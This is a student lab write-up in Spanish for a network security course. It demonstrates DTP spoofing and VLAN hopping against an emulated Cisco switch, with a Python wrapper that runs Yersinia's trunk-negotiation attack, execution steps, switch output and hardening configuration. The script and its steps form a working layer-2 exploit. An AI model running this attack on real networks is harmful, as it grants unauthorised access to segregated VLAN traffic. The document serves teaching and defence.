# 🛡️ Security Audit: Dynamic Trunking Protocol (DTP) Spoofing & VLAN Hopping

## 📝 Información del Estudiante

* **Institución:** Instituto Tecnológico de Las Américas (ITLA)
* **Asignatura:** Seguridad de Redes
* **Auditor Técnico:** Zoe Daniela Bobonagua Acevedo
* **Matrícula:** 2025-0839
* **Evidencia Audiovisual:** [▶️ Ver Video de Demostración](https://youtu.be/JVsR10vQeUM)

---

## 🎯 1. Objetivo del Laboratorio

El propósito fundamental de esta auditoría es evaluar la seguridad de la infraestructura de Capa 2 frente a la confianza implícita del protocolo **DTP (Dynamic Trunking Protocol)** de Cisco. La práctica demuestra cómo un nodo no autorizado (**kali-1**) puede suplantar a un switch legítimo enviando tramas de negociación DTP falsificadas para forzar un enlace troncal (*trunk*) en un puerto de acceso, permitiendo posteriormente realizar un ataque de *VLAN Hopping* para acceder a segmentos de red restringidos.

---

## 📐 2. Arquitectura de la Red Emulada

La infraestructura física y lógica fue replicada en GNS3 operando bajo el segmento IP de gestión/auditoría **20.25.83.0/24**.

### Diagrama de Flujo Lógico

```text
                      +-----------------------+
                      |        Sw-Core        |
                      |    (Cisco IOSv-L2)    |
                      +-----------------------+
                                  | Gi0/0
                                  |
                                  | Gi0/0
                      +-----------------------+
                      |       Sw-Access       |
                      |    (Cisco IOSv-L2)    |
                      +-----------------------+
                         | Gi1/2           | Gi1/1
                         |                 |
                         | e0              | e0
          +--------------------+     +--------------------+
          |    kali-1 (VM)     |     |     PC1 (VPCS)     |
          |  Auditor Técnico   |     |   Cliente de Red   |
          +--------------------+     +--------------------+


```

### Cuadro de Direccionamiento e Interfaces

| Dispositivo | Interfaz Física | Tipo de Enlace Inicial | Dirección IP | Máscara de Red | Estado del Switchport (Por Defecto) |
| --- | --- | --- | --- | --- | --- |
| **Sw-Core** | Gi0/0 | Troncal | `20.25.83.2 /24` | `255.255.255.0` | `switchport mode trunk` |
| **Sw-Access** | Gi0/0 | Troncal | `20.25.83.3 /24` | `255.255.255.0` | `switchport mode trunk` |
| **Sw-Access** | Gi1/1 | Acceso (VLAN 83) | N/A | N/A | `switchport mode dynamic auto` |
| **Sw-Access** | Gi1/2 | Acceso (VLAN 83) | N/A | N/A | `switchport mode dynamic auto` (Vulnerable) |
| **kali-1** | e0 (`eth0`) | Auditoría | `20.25.83.99` | `255.255.255.0` | Cambia a **Trunk** tras el ataque |
| **PC1** | e0 | Acceso | `20.25.83.11` | `255.255.255.0` | Permanence en modo acceso estático |

---

## 💻 3. Documentación Técnica del Script (`dtp_attack.py`)

### Análisis Operativo del Código

El script en Python automatiza el despliegue del software de auditoría de Capa 2 **Yersinia** mediante el uso del módulo `subprocess`. Su lógica operativa consta de:

1. **Validación de Privilegios:** Comprueba que el script se ejecute con UID `0` (`root/sudo`), mandatorio para inyectar paquetes directamente en las interfaces de red.
2. **Abstracción de Yersinia:** Invoca el comando `["yersinia", "dtp", "-attack", "1", "-interface", "eth0"]`.
3. **Mapeo de Parámetros:** * `dtp`: Inicializa el motor del protocolo Dynamic Trunking Protocol.
* `-attack 1`: Envía tramas DTP en modo *Dynamic Desirable*, solicitando de manera activa e insistente al conmutador vecino crear un enlace troncal.
* `-interface eth0`: Inyecta los paquetes saliendo por la interfaz de red de la VM de Kali Linux conectada al puerto vulnerable `Gi1/2` del switch.



### Código de la Herramienta

```python
#!/usr/bin/env python3
import os
import sys
import subprocess
import time

INTERFACE = "eth0"

def verificar_privilegios():
    """Asegura que el script se ejecute con permisos de root"""
    if os.getuid() != 0:
        print("[-] Error: Este script requiere privilegios de administrador.")
        print(f"[*] Intenta ejecutarlo usando: sudo python3 {sys.argv[0]}")
        sys.exit(1)

def ejecutar_ataque_yersinia():
    verificar_privilegios()
    
    print(f"[*] Iniciando automatización de ataque de Capa 2...")
    print(f"[*] Convocando a Yersinia para atacar la interfaz {INTERFACE}...")
    
    # Construcción del comando nativo de Yersinia
    # dtp -> módulo del protocolo
    # -attack 1 -> ataque tipo 'Enable Trunking'
    # -interface -> puerto físico de salida
    comando = ["yersinia", "dtp", "-attack", "1", "-interface", INTERFACE]
    
    try:
        print("[+] Inyectando ráfaga de negociación DTP (Modo Desirable/Trunk)...")
        
        # Ejecutamos el subproceso de forma transparente en el fondo
        process = subprocess.Popen(comando, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Dejamos que el ataque corra durante unos segundos para estabilizar la negociación
        print("[*] Manteniendo el ataque activo para forzar la transición en el switch...")
        time.sleep(5)
        
        # Terminamos el proceso de Yersinia limpiamente
        process.terminate()
        print("[+] Ráfaga completada con éxito.")
        print("[+] Revisa el estado del puerto usando 'show interfaces trunk' en tu switch.")
        
    except FileNotFoundError:
        print("[-] Error: 'yersinia' no se encuentra instalado en este sistema.")
        print("[*] Puedes instalarlo ejecutando: sudo apt update && sudo apt install yersinia -y")
    except Exception as e:
        print(f"[-] Ocurrió un error inesperado durante la ejecución: {e}")

if __name__ == "__main__":
    ejecutar_ataque_yersinia()


```
## 🚀 4. Guía de Ejecución y Diagnóstico de Anomalías

### Paso 1: Comprobar el Estado Original (Línea Base Segura)

Antes de iniciar el ataque, verifique el estado del puerto `Gi1/2` en el conmutador **Sw-Access**. Por defecto, se encuentra negociando en modo automático:

```text
Sw-Access# show interfaces gigabitEthernet 1/2 switchport
Administrative Mode: dynamic auto
Operational Mode: static access

```

### Paso 2: Ejecución del Script de Auditoría DTP

Ejecute la automatización en la máquina **kali-1** para iniciar la inyección de tramas DTP falsificadas:

```bash
chmod +x dtp_attack.py
sudo ./dtp_attack.py

```

### Paso 3: Evidencia del Levantamiento de Troncal (VLAN Hopping)

Vuelva a la consola de **Sw-Access** y repita el comando. Notará que la negociación ha sido exitosa y el estado operativo del puerto habrá cambiado a **Trunk**:

```text
Sw-Access# show interfaces gigabitEthernet 1/2 switchport
Administrative Mode: dynamic auto
Operational Mode: trunk

```

*A partir de este momento, desde **kali-1** se pueden crear subinterfaces etiquetadas (ej. `eth0.10`, `eth0.20`) para saltar de VLAN e interceptar tráfico de otros segmentos.*

---

## 🛠️ 5. Plan de Mitigación e Ingeniería de Hardening

> [!IMPORTANT]
> Para neutralizar los ataques DTP no basta con apagar el protocolo. La mejor práctica de la industria dicta deshabilitar la negociación global en los puertos asignados a usuarios finales.

### Configuración Defensiva (Copiar y pegar en Sw-Access)

Para inmunizar por completo el conmutador **Sw-Access** contra la negociación de troncales maliciosos, aplique la siguiente directiva en las interfaces de acceso (`Gi1/1` y `Gi1/2`):

```text
configure terminal
!
interface range GigabitEthernet 1/1 - 2
 ! 1. Forzar el puerto a operar estrictamente en modo acceso
 switchport mode access
 !
 ! 2. Asignar la VLAN correspondiente
 switchport access vlan 83
 !
 ! 3. Apagar por completo el protocolo DTP en la interfaz
 switchport nonegotiate
exit
end

```

### Comprobación de la Eficiencia de la Defensa

Si vuelve a intentar ejecutar el script de Yersinia desde **kali-1** después de aplicar el hardening, el puerto `Gi1/2` ignorará de forma absoluta las solicitudes enviadas por el script. Al revisar el estado, el puerto permanecerá seguro:

```text
Sw-Access# show interfaces gigabitEthernet 1/2 switchport
Administrative Mode: static access
Operational Mode: static access
Negotiation of Trunking: Off

```

El ataque de *VLAN Hopping* habrá quedado completamente mitigado.

---

## ⚖️ 6. Aviso de Uso Académico

Este proyecto ha sido desarrollado exclusivamente bajo un entorno académico controlado dentro de los laboratorios del **ITLA** para la materia **Seguridad de Redes**. Queda estrictamente prohibido el uso de estas técnicas en redes de producción o infraestructuras externas sin los debidos permisos explícitos de los administradores de sistemas.

```

```
